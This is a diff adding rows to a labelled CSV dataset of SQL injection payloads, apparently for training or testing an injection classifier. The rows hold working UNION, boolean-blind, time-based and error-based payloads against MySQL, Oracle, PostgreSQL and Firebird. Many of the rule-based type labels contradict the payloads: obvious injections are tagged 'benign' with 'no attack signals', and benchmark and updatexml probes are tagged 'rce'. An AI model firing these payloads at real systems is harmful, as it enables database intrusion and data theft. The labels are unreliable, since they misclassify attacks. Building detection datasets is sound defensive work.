@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+2430,1 ) where 8375 = 8375,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2431,1' in boolean mode ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2432,1' order by 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2433,select case when 3920 = 4402 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2434,1' ) ) ) and 5615 = 5458--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2435,"-8810' ) or make_set ( 9354 = 9354,7185 ) and ( 'prsn' like 'prsn",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
+2436,"-5706"" ) ) union all select 2013,2013,2013,2013#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2437,1' ) where 9159 = 9159,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2438,"-7860' ) ) ) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2439,"-3546%"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2440,1' ) where 2928 = 2928,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2441,"1"" ) ) as ajwe where 1153 = 1153 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
+2442,"1%' ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( '%' = '",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+2443,-9668' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,,boolean_blind,generic,0.95,5822 = 5822 or detected — boolean_blind injection (priority 8) on generic,rule-based
+2444,-2648' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'sawt' = 'sawt,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
+2445,select ( case when ( 2140 = 5325 ) then 2140 else 2140* ( select 2140 from information_schema.character_sets ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2446,select ( case when ( 1123 = 9550 ) then 1123 else 1123* ( select 1123 from information_schema.character_sets ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2447,"-9140"" ) ) union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2448,"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2449,-4669 ) or 2452 = 1601#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2450,1%' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( '%' = ',1,,boolean_blind,firebird,0.95,) and ( detected — boolean_blind injection (priority 8) on firebird,rule-based
+2451,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'rozr' like 'rozr,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+2452,"-7122"" ) union all select 4002,4002,4002,4002,4002,4002,4002,4002#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2453,"-3460%"" ) ) ) or 9323 = 9323#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2454,select ( case when ( 4666 = 4666 ) then 1 else 4666* ( select 4666 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2455,"1' ) ) as mdtm where 1393 = 1393 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,1393 = 1393 and detected — boolean_blind injection (priority 8) on generic,rule-based
+2456,-8057' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,,boolean_blind,postgresql,0.95,4205 = 4205 or detected — boolean_blind injection (priority 8) on postgresql,rule-based
+2457,"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
+2458,1'+ ( select eluw where 6210 = 6210,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2459,"1 ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
